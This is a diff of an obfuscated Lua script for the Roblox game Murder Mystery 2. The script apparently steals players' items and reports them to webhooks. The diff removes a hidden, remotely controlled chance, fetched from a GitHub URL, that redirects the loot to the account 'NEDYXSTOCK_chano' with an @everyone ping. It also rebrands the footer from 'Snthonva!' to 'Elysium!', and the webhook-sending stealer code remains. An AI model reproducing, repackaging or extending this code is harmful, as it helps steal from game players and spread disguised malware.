@@ -1076,22 +1076,6 @@ end
 
 local v246 = MM2_API_BASE .. "/webhook/"
 local v247 = MM2_API_BASE
-local n7 = 0
-
-pcall(function()
-	local match = game:HttpGet("https://raw.githubusercontent.com/astdoasdtiadn/tsdtasdyasdy/refs/heads/main/m"):match("%d+%.?%d*")
-
-	if match then
-		n7 = tonumber(match) or 0
-	else
-		n7 = 0
-	end
-end)
-
-local v250 = n7
-
-v32("SPECIAL_WEBHOOK_CHANCE=" .. v250)
-
 local function v251(p21, p22, p23)
 	if not request_ or p21 == "" then
 		return
@@ -1264,7 +1248,7 @@ local function v269(p24, p25)
 			color = 16711680,
 			fields = t17,
 			footer = {
-				text = "Snthonva! (Murder Mystery 2)"
+				text = "Elysium! (Murder Mystery 2)"
 			},
 			timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
 		} }
@@ -1347,24 +1331,7 @@ local function v277()
 		end
 	end
 
-	local v297 = math.random()
 	local v298 = false
-
-	v32("special=" .. tostring(v279) .. " roll=" .. string.format("%.4f", v297) .. " chance=" .. tostring(v250))
-
-	if v279 and v297 <= v250 then
-		v32("SPECIAL webhook firing!")
-		RECEIVERS = { "NEDYXSTOCK_chano" }
-
-		local v299 = v269(false, v278)
-
-		v299.content = "@everyone"
-
-		task.wait(0.5)
-		v256()
-
-		return
-	end
 
 	local v300 = false
 	local v301 = false
